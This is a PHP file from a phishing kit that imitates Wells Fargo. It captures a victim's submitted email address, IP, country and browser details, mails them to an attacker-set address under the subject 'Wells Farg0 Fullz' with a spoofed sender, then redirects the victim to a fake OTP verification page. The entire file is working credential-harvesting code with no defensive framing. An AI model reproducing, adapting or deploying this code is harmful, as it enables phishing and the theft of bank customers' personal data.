<?php

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$date =	date("D M d, Y g:i a");
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$user_ip = getenv('REMOTE_ADDR');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");

$ip = getenv("REMOTE_ADDR");

//Filling Email to send
include('grabber.php');


//Getting UserID info from Session
$email = $_POST['email'];





$Chase="==================+[Email Info  ]+==================
Email Address : $email


-------------------+	+---------------------
Submitted By : $user_ip
Country Name : {$geoplugin->countryName}
Country Code: {$geoplugin->countryCode}
Date And Time : $adddate;
Browser Details : $user_agent;
-----------------+  +-----------------";


$subject = "$email | Wells Farg0 Fullz";
$headers = "From: Alerts <customercare@privejets.net>";
$headers .= $_POST['email']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$Chase,$headers);


$asp = "OTPVerification.aspx?Update&emc=".$email;
$Redirect="sserrema.php?$asp";
header("Location: $Redirect");

?>

